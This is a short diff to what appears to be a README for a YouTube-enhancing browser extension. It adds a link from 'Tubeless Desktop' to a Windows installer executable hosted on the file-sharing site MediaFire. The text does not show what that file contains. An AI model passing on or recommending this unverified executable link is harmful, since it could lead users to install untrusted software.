@@ -22,7 +22,7 @@
 
 ## Overview
 
-A comprehensive toolkit to transform YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via Tubeless Desktop—all running locally with zero telemetry.
+The extension transforms YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file" target="_blank">Tubeless Desktop</a>, all running locally with zero telemetry.
 
 ---
 
